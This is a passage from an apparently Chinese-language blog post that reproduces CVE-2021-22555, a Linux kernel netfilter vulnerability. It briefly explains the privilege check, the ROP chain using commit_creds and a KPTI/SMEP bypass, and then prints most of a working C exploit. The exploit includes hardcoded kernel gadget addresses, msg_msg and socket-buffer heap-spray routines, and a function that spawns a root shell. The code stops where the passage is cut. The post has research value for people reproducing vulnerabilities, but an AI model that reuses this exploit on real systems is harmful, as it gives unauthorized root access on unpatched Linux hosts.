<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_ipt_set_ctl</span><span class="params">(struct sock *sk, <span class="keyword">int</span> cmd, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	<span class="comment">//提到当兼容模式下需要CAP_NET_ADMIN权限</span></span><br><span class="line">	<span class="keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>而用户空间隔离出独立的命名空间后就能拥有<code>CAP_NET_ADMIN</code>权限，所以需要，其实也不是太懂这个干啥的。</p>
<p>其他的好像也没有什么了，就是最后的<code>ROP</code>链条方面的东西，由于最后触发劫持程序流的时候，<code>rsi</code>为<code>UAF</code>对象地址，所以利用<code>gadget</code>先进行栈劫持<code>rsp</code>，然后使用利用<code>commit_creds(&amp;init_cred)</code>获取ROOT权限，之后使用<code>SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE</code>绕过<code>KPTI</code>和<code>SMEP</code>即可。</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006" >Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="3-最终EXP"   >
          <a href="#3-最终EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-最终EXP" class="headerlink" title="(3)最终EXP"></a>(3)最终EXP</h3>
      <p>主要是<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/bsauce/kernel-exploit-factory" >bsauce师傅的EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>和<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >arttnba3师傅的EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，然后改巴改巴，加了点东西，替换了一下ROP链条什么的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//compile exp: $ gcc -m32 -static -masm=intel -o exploit exploit.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_SOCKETS 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_SKBUFFS 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_PIPEFDS 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_MSQIDS 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOLE_STEP 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_PRIMARY 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_SECONDARY 0x42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_FAKE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Gadget </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUSH_RSI_JMP_RSI_0x2E 0xffffffff81b4e244</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_0x98_RET 0xffffffff81a7895e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff81900644</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff81001629</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff8244c8a0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff8108e690</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00df0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82019340</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//pt_regs</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKB_SHARED_INFO_SIZE 0x140</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_MSG_SIZE (sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//some struct</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> m_list_next;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_list_prev;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_type;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_ts;</span><br><span class="line">  <span class="keyword">uint64_t</span> next;</span><br><span class="line">  <span class="keyword">uint64_t</span> security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> page;</span><br><span class="line">  <span class="keyword">uint32_t</span> offset;</span><br><span class="line">  <span class="keyword">uint32_t</span> len;</span><br><span class="line">  <span class="keyword">uint64_t</span> ops;</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line">  <span class="keyword">uint32_t</span> pad;</span><br><span class="line">  <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">  <span class="keyword">uint64_t</span> release;</span><br><span class="line">  <span class="keyword">uint64_t</span> steal;</span><br><span class="line">  <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[PRIMARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">&#125; msg_primary;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">&#125; msg_secondary;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];</span><br><span class="line">&#125; msg_fake;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_msg_msg</span><span class="params">(struct msg_msg *msg, <span class="keyword">uint64_t</span> m_list_next,</span></span></span><br><span class="line"><span class="params"><span class="function">                   <span class="keyword">uint64_t</span> m_list_prev, <span class="keyword">uint64_t</span> m_ts, <span class="keyword">uint64_t</span> next)</span> </span>&#123;</span><br><span class="line">  msg-&gt;m_list_next = m_list_next;</span><br><span class="line">  msg-&gt;m_list_prev = m_list_prev;</span><br><span class="line">  msg-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">  msg-&gt;m_ts = m_ts;</span><br><span class="line">  msg-&gt;next = next;</span><br><span class="line">  msg-&gt;security = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;failed to gain the root!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  *(<span class="keyword">long</span> *)msgp = msgtyp;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgsnd&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">peek_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT) &lt;</span><br><span class="line">      <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgrcv&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgrcv&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_skbuff</span><span class="params">(<span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>], <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (write(ss[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_skbuff</span><span class="params">(<span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (read(ss[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] read&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 